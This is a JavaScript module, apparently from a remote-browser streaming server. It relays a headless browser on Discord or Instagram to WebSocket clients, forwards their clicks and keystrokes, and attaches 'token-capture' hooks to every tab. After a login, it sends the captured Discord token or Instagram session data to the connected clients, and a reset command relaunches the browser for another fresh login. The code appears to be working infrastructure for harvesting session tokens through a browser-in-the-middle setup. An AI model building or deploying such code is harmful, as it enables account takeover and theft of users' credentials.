// ── stream-handler.js ─────────────────────────────────────
// WebSocket connection handling and browser input forwarding.

const {
    SVC, MAX_CLIENTS, MAX_TABS,
    BROWSER_WIDTH, BROWSER_HEIGHT, SCREENSHOT_QUALITY, URLS,
    getActivePage, getTabList,
    touchActivity, resetTimeoutTimer,
    startScreenshots, stopScreenshots,
    launchBrowser, closeBrowser,
    send, broadcast
} = require('./browser-manager');
const { setupDiscordCapture, setupInstagramCapture } = require('./token-capture');

function initWebSocket(wss) {
    wss.on('connection', (ws, req) => {
        const parsed = new URL(req.url, 'http://localhost');
        const isStream = parsed.pathname === '/stream' || parsed.pathname === '/stream/';
        const svcName = isStream ? (parsed.searchParams.get('type') || '').toLowerCase() : '';

        if (!SVC[svcName]) { ws.close(1008, 'Invalid type — use ?type=discord or ?type=instagram'); return; }

        const svc = SVC[svcName];

        if (svc.clients.size >= MAX_CLIENTS) { ws.close(1013, 'Too many clients'); return; }

        const clientTimeout = parseInt(parsed.searchParams.get('timeout'));
        if (!isNaN(clientTimeout) && clientTimeout >= 0) {
            svc.timeoutSeconds = Math.min(clientTimeout, 3600);
        }

        svc.clients.add(ws);
        touchActivity(svc, svcName);
        console.log(`[${svcName}] Client connected (${svc.clients.size} total)`);

        ws.on('close', () => {
            svc.clients.delete(ws);
            console.log(`[${svcName}] Client disconnected (${svc.clients.size} remaining)`);
            if (svc.clients.size === 0) {
                stopScreenshots(svc);
                if (svc.timeoutTimer) { clearTimeout(svc.timeoutTimer); svc.timeoutTimer = null; }
            }
        });

        ws.on('error', () => svc.clients.delete(ws));

        ws.on('message', async (raw) => {
            if (raw.length > 50000) return;
            let msg;
            try { msg = JSON.parse(raw); } catch (_) { return; }
            touchActivity(svc, svcName);

            if (msg.type === 'newtab') {
                if (svc.pages.length >= MAX_TABS) {
                    send(ws, { type: 'error', message: `Max ${MAX_TABS} tabs reached` });
                    return;
                }
                try {
                    const page = await svc.context.newPage();
                    const tabId = 'tab-' + Date.now();
                    await page.goto(msg.url || URLS[svcName], { waitUntil: 'domcontentloaded' });
                    const title = await page.title().catch(() => 'New Tab');
                    svc.pages.push({ page, id: tabId, title });
                    if (svcName === 'discord') setupDiscordCapture(svc, svc.pages.length - 1);
                    else setupInstagramCapture(svc, svc.pages.length - 1);
                    svc.activeTabIndex = svc.pages.length - 1;
                    broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
                    console.log(`[${svcName}] New tab opened: ${tabId}`);
                } catch (e) {
                    send(ws, { type: 'error', message: 'Failed to open new tab: ' + e.message });
                }
                return;
            }

            if (msg.type === 'switchtab') {
                const idx = typeof msg.index === 'number' ? msg.index : -1;
                if (idx >= 0 && idx < svc.pages.length) {
                    svc.activeTabIndex = idx;
                    broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
                    const page = getActivePage(svc);
                    if (page) {
                        try {
                            const buf = await page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
                            broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex });
                        } catch (_) {}
                    }
                }
                return;
            }

            if (msg.type === 'closetab') {
                const idx = typeof msg.index === 'number' ? msg.index : svc.activeTabIndex;
                if (svc.pages.length <= 1) { send(ws, { type: 'error', message: 'Cannot close the last tab' }); return; }
                if (idx >= 0 && idx < svc.pages.length) {
                    const removed = svc.pages.splice(idx, 1)[0];
                    try { removed.page.removeAllListeners(); await removed.page.close(); } catch (_) {}
                    if (svc.activeTabIndex >= svc.pages.length) svc.activeTabIndex = svc.pages.length - 1;
                    broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
                    console.log(`[${svcName}] Tab closed: ${removed.id}`);
                }
                return;
            }

            if (msg.type === 'navigate') {
                const page = getActivePage(svc);
                if (page && msg.url) {
                    try {
                        const p = new URL(msg.url);
                        if (!['http:', 'https:'].includes(p.protocol)) {
                            send(ws, { type: 'error', message: 'Invalid URL protocol' });
                            return;
                        }
                        await page.goto(msg.url, { waitUntil: 'domcontentloaded' });
                    } catch (e) {
                        if (e instanceof TypeError) send(ws, { type: 'error', message: 'Invalid URL' });
                    }
                }
                return;
            }

            if (msg.type === 'settimeout') {
                const t = parseInt(msg.seconds);
                if (!isNaN(t) && t >= 0) {
                    svc.timeoutSeconds = t;
                    resetTimeoutTimer(svc, svcName);
                    broadcast(svc, { type: 'status', text: t > 0 ? `Timeout set to ${t}s` : 'Timeout disabled' });
                }
                return;
            }

            if (msg.type === 'reset') {
                if (!svc.tokenCaptured) return;
                console.log(`[${svcName}] Reset requested — relaunching browser`);
                svc.tokenCaptured = false;
                svc.capturedSession = null;
                svc.capturedToken = null;
                broadcast(svc, { type: 'status', text: 'Relaunching browser for fresh login...' });
                try { await closeBrowser(svc, svcName); } catch (_) {}
                try {
                    await launchBrowser(svcName);
                    startScreenshots(SVC[svcName], svcName);
                } catch (e) {
                    console.error(`[${svcName}] Relaunch failed:`, e.message);
                    broadcast(svc, { type: 'error', message: 'Failed to relaunch browser.' });
                }
                return;
            }

            const page = getActivePage(svc);
            if (!page) return;
            await handleInput(svc, msg);
        });

        // Send initial state
        if (svc.tokenCaptured) {
            if (svcName === 'instagram' && svc.capturedSession) {
                send(ws, { type: 'session', ...svc.capturedSession });
            } else if (svcName === 'discord' && svc.capturedToken) {
                send(ws, { type: 'token', token: svc.capturedToken });
            } else {
                send(ws, { type: 'status', text: 'Session expired — click Connect to re-login' });
            }
            return;
        }

        send(ws, { type: 'status', text: 'Connected — log in to continue' });
        send(ws, { type: 'tabs', tabs: getTabList(svc) });
        send(ws, { type: 'config', timeout: svc.timeoutSeconds });

        const page = getActivePage(svc);
        if (page && !svc.tokenCaptured) {
            page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY })
                .then(buf => send(ws, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex }))
                .catch(() => {});
        }
    });
}

async function handleInput(svc, msg) {
    const page = getActivePage(svc);
    if (!page) return;
    try {
        const bx = (msg.x ?? 0) * BROWSER_WIDTH;
        const by = (msg.y ?? 0) * BROWSER_HEIGHT;
        switch (msg.type) {
            case 'mousemove': await page.mouse.move(bx, by); break;
            case 'click':     await page.mouse.click(bx, by, { button: msg.button || 'left' }); break;
            case 'dblclick':  await page.mouse.dblclick(bx, by); break;
            case 'mousedown': await page.mouse.down({ button: msg.button || 'left' }); break;
            case 'mouseup':   await page.mouse.up({ button: msg.button || 'left' }); break;
            case 'scroll':    await page.mouse.wheel(msg.deltaX || 0, msg.deltaY || 0); break;
            case 'keydown':   if (msg.key) await page.keyboard.down(normalizeKey(msg.key)); break;
            case 'keyup':     if (msg.key) await page.keyboard.up(normalizeKey(msg.key)); break;
            case 'input':     if (msg.text) await page.keyboard.type(msg.text); break;
        }
    } catch (_) {}
}

function normalizeKey(key) {
    const map = {
        ' ': 'Space', 'ArrowLeft': 'ArrowLeft', 'ArrowRight': 'ArrowRight',
        'ArrowUp': 'ArrowUp', 'ArrowDown': 'ArrowDown', 'Backspace': 'Backspace',
        'Delete': 'Delete', 'Enter': 'Enter', 'Tab': 'Tab', 'Escape': 'Escape',
        'Shift': 'Shift', 'Control': 'Control', 'Alt': 'Alt', 'Meta': 'Meta',
        'CapsLock': 'CapsLock', 'Home': 'Home', 'End': 'End',
        'PageUp': 'PageUp', 'PageDown': 'PageDown',
    };
    return map[key] || key;
}

module.exports = { initWebSocket };
